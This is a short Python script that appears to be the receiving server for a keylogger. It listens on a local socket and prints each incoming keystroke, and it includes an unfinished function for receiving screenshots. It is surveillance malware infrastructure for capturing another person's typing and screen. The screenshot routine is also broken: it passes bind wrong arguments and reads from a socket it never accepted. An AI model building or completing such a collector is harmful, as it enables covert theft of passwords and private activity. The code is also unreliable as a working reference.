import socket
from PIL import Image, ImageTk
import tkinter as tk
import io
def start_server():
    host = '127.0.0.1'
    port = 1234

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen(1)
        print("Server listening on " + host + ":" + str(port))

        conn, addr = s.accept()
        #addr[1] is the port
        print("Connected by ",addr[0]," Port : ",addr[1])

        while True:
            data = conn.recv(1024)
            if not data:
                break
            keylogger = data.decode()
            print("Key hit : ",keylogger)


        print("Client disconnected.")
def receive_screenshot():
    host = '127.0.0.1'
    port = 12345
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(host,port)
    server_socket.listen(5)
    the_size_of_the_picture = int(server_socket.recv(1024).decode())
    picture_bytes = b''
    while len(picture_bytes) < the_size_of_the_picture:
            data = server_socket.recv(1024)
            if not data:
                break
            picture_bytes += data



start_server()
#receive_screenshot()
